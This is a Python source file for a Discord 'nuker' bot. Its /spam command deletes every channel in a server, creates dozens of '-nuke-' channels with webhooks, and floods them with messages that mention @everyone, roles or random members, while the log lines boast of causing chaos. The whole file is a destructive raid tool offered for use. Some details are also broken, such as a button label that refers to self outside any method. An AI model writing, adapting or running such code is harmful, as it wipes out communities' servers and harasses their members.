import os
import threading
import discord
from discord.ext import commands
# 🚨 uiモジュールを明示的にインポート
from discord import app_commands, ui
from discord import utils
from flask import Flask, jsonify
import logging
import asyncio
import random 
import time
import requests 
import json

# ログ設定: 警告レベル以上のみ表示
logging.basicConfig(level=logging.WARNING)

# 🚨 --- 監視・保護対象の定義 ---
EXCLUDED_GUILD_ID = 1443617254871662642 
# レポート機能も削除するため、REPORT_CHANNEL_IDは不要だが、コードの安定性のために残しておく
REPORT_CHANNEL_ID = 1443878284088705125 
# -----------------------------

# --- KeepAlive用: Flaskアプリの定義 ---
app = Flask(__name__)

# --- Discord Bot Setup ---
intents = discord.Intents.default()
# 荒らし機能に必要な最低限のインテントを有効化
intents.guilds = True
intents.members = True # メンションロジックのために必要
intents.message_content = False # テキストコマンドは排除されたため不要

# 🚨 BotのPrefixコマンドは排除されたが、commands.Botの初期化は必要
bot = commands.Bot(command_prefix="!", intents=intents)
# 🚨 スラッシュコマンドを管理するためのCommandTree
tree = app_commands.CommandTree(bot) 

# 環境変数からの設定
try:
    DISCORD_BOT_TOKEN = os.environ.get("DISCORD_BOT_TOKEN") 
    if not DISCORD_BOT_TOKEN:
        logging.error("FATAL ERROR: 'DISCORD_BOT_TOKEN' is missing.")
except Exception as e:
    DISCORD_BOT_TOKEN = None
    logging.error(f"Initialization Error: {e}")


# ----------------------------------------------------
# --- 💀 メンション生成ヘルパー機能 ---
# ----------------------------------------------------

def get_mention_string(guild, mention_type):
    """指定されたタイプに応じてメンション文字列を生成する"""
    if mention_type == "everyone":
        return "@everyone"
    
    elif mention_type == "role":
        # @everyone以外の、最も高い位置にあるメンション可能なロールを選択
        roles = sorted(
            [r for r in guild.roles if r != guild.default_role and r.mentionable],
            key=lambda r: r.position,
            reverse=True
        )
        return roles[0].mention if roles else "@everyone" 

    elif mention_type == "random":
        # Botとサーバー主を除いたランダムなメンバーを選択
        members = [m for m in guild.members if not m.bot and m != guild.owner]
        return random.choice(members).mention if members else "@everyone" 

    elif mention_type == "none":
        return ""
        
    return "" 

# ----------------------------------------------------
# --- 💀 Webhook スパムヘルパー機能 ---
# ----------------------------------------------------

async def send_webhook_spam(webhook_url, content):
    """Webhookを使用してメッセージを送信する（Botログインセッションとは独立）"""
    payload = {
        "content": content,
        "username": "Ruru The Webhook Nuker",
        "avatar_url": "https://i.imgur.com/uR8NlIu.png" # 任意のアイコンURL
    }
    
    try:
        response = await asyncio.to_thread(
            requests.post, 
            webhook_url, 
            data=json.dumps(payload), 
            headers={"Content-Type": "application/json"}
        )
        
        if response.status_code == 204: 
            return True
        elif response.status_code == 429:
            retry_after = response.json().get('retry_after', 1) 
            logging.warning(f"WEBHOOK TERROR: Webhookレート制限 (429)。{retry_after}秒後にリトライ。")
            await asyncio.sleep(retry_after + 0.1)
            return False
        else:
            logging.error(f"WEBHOOK TERROR: Webhook送信中に予期せぬエラーが発生: {response.status_code} - {response.text}")
            return False
            
    except Exception as e:
        logging.error(f"WEBHOOK TERROR: Webhook送信中に予期せぬエラーが発生: {e}")
        return False


# ----------------------------------------------------
# --- 🚨 スパム実行ビュー (ボタン付きインタラクション) ---
# ----------------------------------------------------

class SpamExecutionView(ui.View):
    """スパム実行ボタンと、そのロジックを保持するView"""
    
    def __init__(self, webhook_urls, mention_type, custom_message, original_user_id):
        super().__init__(timeout=300) # 5分後にタイムアウト
        self.webhook_urls = webhook_urls
        self.mention_type = mention_type
        self.custom_message = custom_message
        self.original_user_id = original_user_id
        self.spam_count = 15 # 送信するメッセージ回数

    async def interaction_check(self, interaction: discord.Interaction) -> bool:
        """ボタンを押したのがコマンド実行者自身かチェックする"""
        if interaction.user.id != self.original_user_id:
            await interaction.response.send_message("❌ **チクショー！** これは**お前専用の破壊ボタン**だ！触るな！", ephemeral=True)
            return False
        return True

    @ui.button(label=f"💥 {self.spam_count}回スパムを実行", style=discord.ButtonStyle.danger, emoji="💣")
    async def confirm_spam(self, interaction: discord.Interaction, button: ui.Button):
        
        # 実行応答
        await interaction.response.send_message(f"💣 **スパム実行開始！** {self.spam_count}回のメッセージを全てのチャンネルに連投する！", ephemeral=True)
        
        button.disabled = True
        # 応答メッセージが既に存在し、ボタンが無効化されるまで実行中であることをユーザーに通知
        try:
             await interaction.message.edit(content=interaction.message.content + "\n\n**実行中...**", view=self) 
        except discord.NotFound:
            # メッセージが消えていたら無視
            pass
        
        guild = interaction.guild
        mention_string = get_mention_string(guild, self.mention_type)

        # 💥 Webhook スパムテキストメッセージを最終構築
        final_spam_content = f"{mention_string} {self.custom_message}"

        # 4. 全てのWebhookにスパムを15回送信
        for j in range(self.spam_count):
            spam_tasks = []
            for webhook_url in self.webhook_urls.values():
                spam_tasks.append(asyncio.create_task(
                    send_webhook_spam(webhook_url, final_spam_content)
                ))
            
            try:
                await asyncio.gather(*spam_tasks)
            except Exception as e:
                logging.warning(f"Webhookスパムラウンド {j+1}/{self.spam_count} の実行中にエラーが発生したぜ。: {e}")
            
            await asyncio.sleep(random.uniform(0.1, 0.5)) 

        # 最終報告 (ボタンを押したユーザーにのみ通知)
        await interaction.followup.send("✅ **スパム完了！** チャンネルはメッセージのゴミで埋め尽くされた！", ephemeral=True)
        
        # ボタンを完全に非表示にするか、完了を知らせるテキストにする
        try:
             await interaction.message.edit(content=interaction.message.content.replace("\n\n**実行中...**", "") + "\n\n**✅ スパム完了！**", view=None)
        except discord.NotFound:
             pass

# ----------------------------------------------------
# --- 💀 スラッシュコマンド (/spam) ---
# ----------------------------------------------------

@tree.command(name="spam", description="新しいチャンネルを作成し、ボタンでWebhookスパムをトリガーする。")
@app_commands.describe(
    mention_type="スパムメッセージに使用するメンションのタイプを選択してください。",
    message_content="スパムとして送信したいメッセージの内容を入力してください。"
)
@app_commands.choices(mention_type=[
    app_commands.Choice(name="全員 (@everyone)", value="everyone"),
    app_commands.Choice(name="最高ロール (@role)", value="role"),
    app_commands.Choice(name="ランダムなユーザー (@user)", value="random"),
    app_commands.Choice(name="メンションなし", value="none")
])
async def spam_command_slash(interaction: discord.Interaction, mention_type: str, message_content: str):
    
    guild = interaction.guild
    
    if not guild or guild.id == EXCLUDED_GUILD_ID:
        await interaction.response.send_message("❌ **失敗だ！** このサーバーでは実行できないぜ。", ephemeral=True)
        return
        
    # 応答をすぐに送信
    await interaction.response.send_message("🛠️ **スパム準備開始！** チャンネルを削除し、Webhookを作成中...", ephemeral=True)
    
    # 1. 全てのチャンネルを削除 
    deletion_tasks = []
    for channel in guild.channels:
        deletion_tasks.append(asyncio.create_task(channel.delete()))
    
    try:
        await asyncio.gather(*deletion_tasks)
        await asyncio.sleep(1.0) 
    except Exception as e:
        logging.error(f"チャンネル削除中にエラーが発生したぜ。: {e}")

    # 2. 絵文字チャンネルを150個作成 (Webhookを設置するため)
    creation_tasks = []
    EMOJIS = "😀😂🤣😅😇🤪🤓😈☠️💀😹🤫" 
    EMOJI_LIST = list(EMOJIS) 
    channel_names = []
    for i in range(15): 
        for emoji in EMOJI_LIST: 
            channel_names.append(f"{emoji}-nuke-{i}") 
            
    for name in channel_names:
        creation_tasks.append(asyncio.create_task(guild.create_text_channel(name)))
    
    successful_channels = []
    try:
        new_channels = await asyncio.gather(*creation_tasks)
        successful_channels = [c for c in new_channels if isinstance(c, discord.TextChannel)]
        await asyncio.sleep(1.0) 
    except Exception as e:
        logging.error(f"チャンネル作成中にエラーが発生したぜ。: {e}")
        
    # 3. Webhookの作成
    webhook_urls = {}
    if successful_channels:
        try:
            for channel in successful_channels:
                # Webhookの管理権限が必要
                webhook = await channel.create_webhook(name="ruru-spam-hook") 
                webhook_urls[channel.id] = webhook.url
        except Exception as e:
            await interaction.followup.send("⚠️ **Webhook作成失敗！** 破壊権限を確認しろ。", ephemeral=True)
            return

    # 4. ボタンを設置して、スパム実行を待機
    if webhook_urls:
        view = SpamExecutionView(
            webhook_urls=webhook_urls,
            mention_type=mention_type,
            custom_message=message_content,
            original_user_id=interaction.user.id
        )
        
        # 最終確認メッセージを送信 (実行者のみに見える)
        await interaction.followup.send(
            f"✅ **準備完了！** 以下の設定でスパムを**15回**実行する準備ができた。\n"
            f"**メンション**: `{mention_type}`\n"
            f"**メッセージ**: `{message_content[:100]}{'...' if len(message_content) > 100 else ''}`\n\n"
            f"**お前だけが見えるボタン**を押して、**破壊**を開始しろ！", 
            view=view, 
            ephemeral=True # 🚨 実行者のみに見えるように設定
        )
    else:
        await interaction.followup.send("❌ **失敗だ！** チャンネルとWebhookの作成に失敗したぜ。", ephemeral=True)


# ----------------------------------------------------
# --- 🤖 Botイベント & KeepAlive Server ---
# ----------------------------------------------------

@bot.event
async def on_ready():
    """Bot起動時とスラッシュコマンドの同期"""
    try:
        # 🚨 スラッシュコマンドをDiscordに同期する
        await tree.sync()
        logging.warning("SLASH COMMANDS SYNCED: /spamコマンドが有効になったぜ！")
    except Exception as e:
        logging.error(f"SLASH COMMAND SYNC ERROR: スラッシュコマンドの同期中にエラーが発生したぜ: {e}")
        
    await bot.change_presence(
        status=discord.Status.dnd,
        # 🚨 表示は/spamのみに
        activity=discord.Game(name="侵入監視と破壊準備... /spam")
    )
    logging.warning(f"Bot {bot.user} is operational and ready to cause chaos!")
    
# 🚨 on_messageイベントを削除（テキストコマンドを完全に排除するため）

# ----------------------------------------------------
# --- KeepAlive Server (Render/Uptime Robot対応) ---
# ----------------------------------------------------

def start_bot():
    """Discord Botの実行を別スレッドで開始する"""
    global DISCORD_BOT_TOKEN
    if not DISCORD_BOT_TOKEN:
        logging.error("Botの実行をスキップ: トークンが設定されてねえぞ。")
    else:
        logging.warning("Discord Botを起動中... 破壊の時だ。")
        try:
            bot.run(DISCORD_BOT_TOKEN, log_handler=None) 
            
        except discord.errors.LoginFailure:
            logging.error("ログイン失敗: Discord Bot Tokenが無効だ！")
        except Exception as e:
            logging.error(f"予期せぬエラーが発生した: {e}")

bot_thread = threading.Thread(target=start_bot)
bot_thread.start()

@app.route("/")
def home():
    """UptimeRobotからのヘルスチェックに応答するエンドポイント"""
    if bot.is_ready():
        return "Bot is running and ready for INSTANT NUKE!"
    else:
        return "Bot is starting up or failed to start...", 503

@app.route("/keep_alive", methods=["GET"])
def keep_alive_endpoint():
    """冗長的なヘルスチェックエンドポイント"""
    return jsonify({"message": "Alive. Now go break something."}), 200
